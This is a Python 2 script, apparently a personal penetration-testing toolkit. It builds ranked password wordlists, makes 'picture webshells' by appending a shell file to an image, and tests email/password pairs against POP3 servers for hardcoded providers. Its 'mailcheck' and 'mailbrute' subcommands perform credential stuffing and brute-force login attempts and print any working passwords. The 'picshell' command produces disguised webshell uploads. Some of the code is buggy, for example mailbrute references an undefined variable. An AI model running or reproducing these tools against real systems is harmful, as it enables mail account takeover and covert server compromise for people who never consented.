#!/usr/local/env python
#-*- coding: UTF-8 -*-

'''
Some useful functions for penetration test.
'''

__author__ = "alpha1e0"


import sys
import argparse
import os
import poplib

reload(sys)
sys.setdefaultencoding("utf-8")


SMALLSIZE = 3000
NORMALSIZE = 10000
MAILSERVERS = { '163.com':{'server':"pop3.163.com"},
                'qq.com':{'server':"pop.qq.com",'ssl':True,'port':995},
                'foxmail.com':{'server':"pop.qq.com"},
                'sina.com':{'server':"pop.sina.com"},
                'vmeti.com':{'server':"vmeti.com"},
                'netwayer.com':{'server':"netwayer.com"},
                'ehanlin.com':{'server':"123.108.216.97"},
                'sootoo.com':{'server':"mail.sootoo.com"},
            }


class PenError(Exception):
    def __init__(self, errorMsg):
        self.errorMsg = errorMsg

    def __str__(self):
        return str(self.errorMsg)


class DictError(PenError):
    def __str__(self):
        return str(" ".join(["Dict error", self.errorMsg]))


def WordList(fileName):
    result = set()
    if os.path.exists(fileName):
        with open(fileName, "r") as fd:
            for line in fd:
                if line.strip() and not line.strip().startswith("/**"):
                    yield line


class Database(object):
    def __init__(self, dbfile):
        self.dbfile = dbfile
        self.list = []
        self._load()


    def _load(self):
        try:
            with open(self.dbfile, "r") as fd:
                for line in fd:
                    if line:
                        splited = line.strip().split(" ")
                        self.list.append([splited[0].strip(), int(splited[1])])
        except IOError as error:
            print "[!]: read all-file error, reason: " + str(error) + "loads empty."


    def dump(self, cast=False):
        self.list.sort(key=lambda x: x[1], reverse=True)
        try:
            with open(self.dbfile, "w") as fd:
                for line in self.list:
                    fd.write("{0} {1}\n".format(line[0],line[1]))
        except IOError:
            raise DictError()

        if cast:
            try:
                smallFD = open(self.dbfile+"_small.txt","w")
                normalFD = open(self.dbfile+"_normal.txt","w")
                largeFD = open(self.dbfile+"_large.txt","w")
            except IOError:
                raise DictError()

            dblen = len(self.list)
            small = SMALLSIZE if SMALLSIZE<dblen else dblen
            normal = NORMALSIZE if NORMALSIZE<dblen else dblen
            large = dblen
            for i in range(dblen):
                if i < small:
                    smallFD.write(self.list[i][0]+"\n")
                    normalFD.write(self.list[i][0]+"\n")
                    largeFD.write(self.list[i][0]+"\n")
                elif i < normal:
                    normalFD.write(self.list[i][0]+"\n")
                    largeFD.write(self.list[i][0]+"\n")
                else:
                    largeFD.write(self.list[i][0]+"\n")

            smallFD.close()
            normalFD.close()
            largeFD.close()


    def add(self, word):
        for line in self.list:
            if word == line[0]:
                line[1] += 1
        else:
            self.list.append([word, 1])


def checkMail(server,user,passwd,ssl=False,port=None):
    if not port:
        port = 995 if ssl else 110

    try:
        pop3 = poplib.POP3_SSL(server, port) if ssl else poplib.POP3(server, port)

        pop3.user(user)
        auth = pop3.pass_(passwd)
        pop3.quit()
    except Exception as error:
        print "[!] chekcing {0} failed, reason:{1}".format(user, str(error))
        return False

    if "+OK" in auth:
        return True
    else:
        return False


#================================sub commands=====================================

def doDictAdd(args):
    rawDictFiles = os.listdir(args.sourcedir)
    print "debug:>>>>>rawDictFiles", rawDictFiles
    dbfile = args.database

    db = Database(dbfile)
    for dictfile in rawDictFiles:
        dictfile = os.path.join(args.sourcedir, dictfile)
        for line in WordList(dictfile):
            #print "debug:>>>>>read line", line, "from", dictfile
            db.add(line.strip())

    db.dump(True)


def doGenPicShell(args):
    with open(args.pic, "rb") as fd:
        picData = fd.read()
    with open(args.shell, "rb") as fd:
        shellData = fd.read()
    with open(args.dest, "wb") as fd:
        fd.write(picData)
        fd.write(shellData)


def doMailChecks(args):
    for line in WordList(args.file):
        info = line.split()
        if len(info) < 2:
            continue
        user = info[0].strip()
        passwd = info[2].strip() if len(info)==3 else info[1].strip()

        serverStr = user.split("@")[1].strip()
        serverInfo = MAILSERVERS.get(serverStr, None)
        server = args.server if args.server else serverInfo['server']
        if not server:
            continue
        port = args.port if args.port else serverInfo.get('port',None)

        print "[+] checking '{0}' '{1}' '{2}'".format(user, passwd, server)
        if checkMail(server, user, passwd, port=port):
            print "[!] success, user is {0}, password is {1}".format(user,passwd)


def doMailBrute(args):
    users = WordList(args.user[1:]) if args.user.startswith("@") else [args.user]
    passwords = WordList(args.passwd[1:]) if args.passwd.startswith("@") else [args.passwd]

    for user in users:
        for password in passwords:
            server = user.split("@")[1].strip()
            server = MAILSERVERS.get(server, None)
            ssl = MAILSERVERS.get('ssl', False)
            port = server.get('port',None)
            if not server:
                continue

            print "[+] checking '{0}' '{1}' '{2}'".format(user, passwd, server['server'])
            
            if checkMail(server['server'], user, passwd, ssl=ssl, port=port):
                print "[!] success, user is {0}, password is {1}".format(user,passwd)


#=====================================main================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(title="subcommands", description="use subcommands")

    # dictadd, add dict to database and generate new wordlists
    dictadd = subparser.add_parser("dictadd", help="add wordlist to database")
    dictadd.add_argument("sourcedir",help="specified the source worldlist directory.")
    dictadd.add_argument("database",help="specified the all dict file.")
    dictadd.set_defaults(func=doDictAdd)

    # picshell, generate a picture webshell
    picshell = subparser.add_parser("picshell", help="generate picture webshell")
    picshell.add_argument("pic",help="specified the picture file or other files to contain the webshell.")
    picshell.add_argument("shell",help="specified the shell file.")
    picshell.add_argument("dest",help="specified the output file.")
    picshell.set_defaults(func=doGenPicShell)

    # mailcheck, check and find useful mail accounts
    mailcheck = subparser.add_parser("mailcheck", help="check and find useful mail accounts")
    mailcheck.add_argument("file",help="specified wordlist, wordlist format is 'xx@xx.com passwd'")
    mailcheck.add_argument("-s","--server",help="specified the POP3 server.")  
    mailcheck.add_argument("-c","--ssl",help="use ssl",action="store_true")
    mailcheck.add_argument("-p","--port",help="specified the port",type=int)
    mailcheck.set_defaults(func=doMailChecks)

    # mail
    mailbrute = subparser.add_parser("mailbrute", help="mail account brute force")
    mailbrute.add_argument("user",help="specified the user of the mail account, use @file to specify user wordlist")
    mailbrute.add_argument("passwd",help="specified the password of the mail account, use @file to specify password wordlist")
    mailbrute.add_argument("-s","--server",help="specified the POP3 server.")  
    mailbrute.add_argument("-c","--ssl",help="use ssl",action="store_true")
    mailbrute.add_argument("-p","--port",help="specified the port",type=int)
    mailbrute.set_defaults(func=doMailBrute)

    args = parser.parse_args()
    args.func(args)


